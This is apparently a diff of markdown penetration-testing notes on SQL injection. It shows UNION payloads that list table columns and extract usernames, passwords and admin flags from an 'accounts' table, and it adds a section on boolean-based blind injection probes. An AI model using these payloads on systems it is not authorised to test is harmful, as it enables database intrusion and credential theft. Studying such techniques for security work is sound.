@@ -131,11 +131,49 @@ __table_name__ is the name of the table
 The above SQL command should return the name of the schemas in the database 
 
  &nbsp; 
- &nbsp
+ &nbsp;
  
 >>>> ' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts'
 
 >>> ' union select username, pass, is_admin from 'accounts'
+
+
+&nbsp; 
+&nbsp;
+
+### Blind SQL:
+
+Every type of injection has different discovery methods. for the Blind SQL, booleans are the key players in understanding 
+
+whether the web app is vulnerable to the injections
+
+
+>> 1' and 1=1 &nbsp; | nbsp; True 
+
+>> 1' and 1=0 &nbsp; 
+|  &nbsp; False 
+
+
+>> 1' order by 1 &nbsp; 
+|  &nbsp; True
+
+
+>> 1' order by 10000 &nbsp; 
+| &nbsp; False
+
+
+
+__Note:__
+
+- The exploitation part is similar to all other types of SQL injections 
+
+- When pentesting a web application, always start with the Blind Injections as they are the complex ones, and can show
+
+  the behavior of the application. The error based are very clear and straightforward, as they show the outputs on 
+
+  the screen 
+
+
 
 
 
